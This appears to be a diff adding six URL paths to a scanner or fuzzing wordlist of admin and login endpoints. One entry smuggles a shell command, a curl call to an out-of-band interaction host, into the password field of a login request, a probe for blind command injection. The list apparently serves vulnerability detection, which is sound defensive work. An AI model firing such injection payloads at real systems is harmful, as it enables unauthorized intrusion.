@@ -1,0 +1,6 @@
+/service/v1/service-details
+/forms/doLogin?login_username=admin&password=password$(curl%20{{interactsh-url}})&x=0&y=0
+/adminweb/
+/admin/wizard.jsp
+/admin/login.jsp
+/login.asp
